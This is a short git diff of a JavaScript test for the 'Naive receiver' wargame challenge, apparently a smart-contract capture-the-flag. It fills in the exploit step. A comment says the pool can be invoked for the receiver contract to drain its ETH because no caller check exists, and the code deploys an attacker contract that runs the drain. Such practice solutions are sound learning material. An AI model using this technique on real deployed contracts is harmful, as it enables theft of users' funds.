@@ -30,7 +30,13 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */ 
+	/* We can call the lender pool on behalf of the receiever contract 
+	 * and drain all ETh since it doesn't require owner to be the caller
+	 */
+	const AttackerFactory = await ethers.getContractFactory('NaiveReceiverAttacker', attacker);
+        this.attacker = await AttackerFactory.deploy(this.pool.address);
+        this.attacker.attack(this.receiver.address);
     });
 
     after(async function () {
